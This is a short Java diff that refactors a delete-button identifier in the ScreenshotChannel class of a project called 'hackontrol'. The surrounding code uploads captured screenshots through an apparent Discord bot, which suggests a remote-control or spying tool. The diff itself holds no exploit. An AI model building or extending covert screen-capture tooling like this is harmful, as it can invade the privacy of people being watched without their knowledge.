@@ -10,7 +10,6 @@ import java.util.Calendar;
 
 import javax.imageio.ImageIO;
 
-import com.khopan.hackontrol.Hackontrol;
 import com.khopan.hackontrol.HackontrolChannel;
 import com.khopan.hackontrol.button.ButtonInteraction;
 import com.khopan.hackontrol.manager.ButtonManager;
@@ -76,7 +75,7 @@ public class ScreenshotChannel extends HackontrolChannel {
 		}
 
 		byte[] byteArray = stream.toByteArray();
-		interaction.getEvent().replyFiles(FileUpload.fromData(byteArray, ScreenshotChannel.getScreenshotFileName())).addActionRow(Button.success(ScreenshotChannel.SCREENSHOT_BUTTON_IDENTIFIER, "Screenshot"), Button.danger(Hackontrol.DELETE_SELF_IDENTIFIER, "Delete")).queue();
+		interaction.getEvent().replyFiles(FileUpload.fromData(byteArray, ScreenshotChannel.getScreenshotFileName())).addActionRow(Button.success(ScreenshotChannel.SCREENSHOT_BUTTON_IDENTIFIER, "Screenshot"), Button.danger(ButtonManager.BUTTON_DELETE_SELF, "Delete")).queue();
 	}
 
 	private static String getScreenshotFileName() {
